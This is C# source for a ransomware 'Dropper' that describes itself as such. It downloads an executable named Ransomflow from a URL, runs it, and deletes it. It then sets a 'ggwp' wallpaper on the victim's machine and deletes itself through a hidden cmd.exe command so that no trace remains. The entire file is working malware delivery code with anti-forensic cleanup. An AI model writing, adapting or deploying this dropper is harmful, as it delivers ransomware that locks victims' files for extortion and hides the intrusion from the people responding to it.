using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;

namespace Dropper
{
    /// <summary>
    /// This class is responsible to get the ransomware from somewhere on the web, execute it, delete it and then autodestruct.
    /// </summary>
    class Dropper
    {
        private static string ransomFlowExecutableUrl = "http://localhost/Ransomflow.exe";
        private static string downloadPath = Path.Combine(Path.GetTempPath(), "ransomflow\\");

        /// <summary>
        /// Program entry point
        /// </summary>
        static void Main(string[] args)
        {
            if (!Directory.Exists(downloadPath))
            {
                Directory.CreateDirectory(downloadPath);
            }

            RunRansomflow();
            SetBackground();
        }

        private static void SetBackground()
        {
            ImageConverter converter = new ImageConverter();
            string backgroundPath = Path.Combine(downloadPath, "ggwp.png");

            File.WriteAllBytes(backgroundPath, (byte[])converter.ConvertTo(Properties.Resources.ggwp, typeof(byte[])));

            Wallpaper.Set(backgroundPath);
        }

        /// <summary>
        /// Downloads the ransomware to a temporary folder, executes it, deletes it and then calls the auto destruct script which will remove this dropper from the victims computer
        /// </summary>
        private static void RunRansomflow()
        {
            string filePath = Path.Combine(downloadPath, "Ramsonflow.exe");

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(ransomFlowExecutableUrl, filePath);
            }

            Process process = Process.Start(filePath);
            process.WaitForExit();

            File.Delete(filePath);
            AutoDestroy();
        }

        /// <summary>
        /// Autodestroys the current program
        /// More info: https://stackoverflow.com/a/24024003/4466024
        /// </summary>
        private static void AutoDestroy()
        {
            Process.Start( new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe"
            });
        }
    }
}
